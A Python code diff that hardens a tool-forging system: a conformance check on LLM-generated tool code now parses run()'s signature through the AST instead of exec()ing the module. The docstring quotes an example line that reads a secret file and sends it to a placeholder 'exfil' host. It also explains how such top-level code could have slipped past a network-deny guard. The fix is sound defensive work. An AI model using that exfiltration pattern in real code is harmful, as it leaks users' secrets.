@@ -12,6 +12,7 @@ Also exposes:
 
 from __future__ import annotations
 
+import ast
 import inspect
 import json
 import logging
@@ -457,29 +458,60 @@ def check_run_conformance(implementation: str, declared_param_names) -> Optional
     caught by the dry-run harness, not here.)
 
     Returns a human-readable error string when non-conforming, else None.
+
+    SECURITY (Lane-1 audit follow-up): this introspects ``run()``'s SIGNATURE
+    STATICALLY via the AST — it NEVER ``exec()``s the forged module. The prior
+    exec ran ALL module-level statements of freshly-LLM-generated (untrusted)
+    code in the daemon at forge time, so a tool with top-level egress
+    (``import requests; requests.get('http://x/exfil?d='+open(secret).read())``)
+    would run BEFORE it was ever an execute_tool-dispatchable tool — bypassing the
+    R-A14a forged-network hard-DENY (which guards the execution chokepoint, not
+    forge conformance). A signature is all this gate needs, and the AST gives it
+    without executing a single line.
     """
-    ns: Dict[str, Any] = {}
     try:
-        exec(compile(implementation, "<forge_conformance>", "exec"), ns)
-    except Exception as exc:
-        return f"could not load module for conformance check: {exc}"
-    run = ns.get("run")
-    if not callable(run):
+        tree = ast.parse(implementation)
+    except SyntaxError as exc:
+        return f"could not parse module for conformance check: {exc}"
+
+    # Find the TOP-LEVEL run() definition (sync or async) without executing.
+    run_def = None
+    has_run_binding = False
+    for node in tree.body:
+        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name == "run":
+            run_def = node
+            break
+        # a non-def `run` binding (assignment / import) — can't statically
+        # introspect a lambda/callable-instance signature; don't block on it.
+        if isinstance(node, ast.Assign) and any(
+                isinstance(t, ast.Name) and t.id == "run" for t in node.targets):
+            has_run_binding = True
+        elif isinstance(node, (ast.Import, ast.ImportFrom)) and any(
+                (a.asname or a.name.split(".")[0]) == "run" for a in node.names):
+            has_run_binding = True
+
+    if run_def is None:
+        if has_run_binding:
+            return None  # a non-def run — not statically checkable; the dry-run harness covers it
         return "tool defines no callable run() — registry calls run(**params)"
-    try:
-        sig = inspect.signature(run)
-    except (TypeError, ValueError) as exc:
-        return f"run() signature is not introspectable: {exc}"
+
+    args = run_def.args
     # A **kwargs catch-all can absorb any declared params -> always conformant.
-    if any(p.kind == inspect.Parameter.VAR_KEYWORD for p in sig.parameters.values()):
+    if args.kwarg is not None:
         return None
+
     declared = set(declared_param_names or [])
-    unfillable = [
-        n for n, p in sig.parameters.items()
-        if p.kind not in (inspect.Parameter.VAR_POSITIONAL, inspect.Parameter.VAR_KEYWORD)
-        and p.default is inspect.Parameter.empty
-        and n not in declared
-    ]
+    # Positional params (positional-only + positional-or-keyword). `defaults`
+    # aligns to the END of the combined positional list, so the last N have
+    # defaults and the rest are REQUIRED. *args (args.vararg) is excluded.
+    positional = list(getattr(args, "posonlyargs", [])) + list(args.args)
+    n_defaults = len(args.defaults)
+    required_positional = positional[:len(positional) - n_defaults] if n_defaults else positional
+    # Keyword-only params with NO default (kw_defaults is 1:1; None ⇒ required).
+    required_kwonly = [a for a, d in zip(args.kwonlyargs, args.kw_defaults) if d is None]
+    required = [a.arg for a in (required_positional + required_kwonly)]
+
+    unfillable = [n for n in required if n not in declared]
     if unfillable:
         return ("run() has required parameter(s) not in the declared schema and no **kwargs: "
                 + ", ".join(unfillable) + f"; declared keys = {sorted(declared)}")
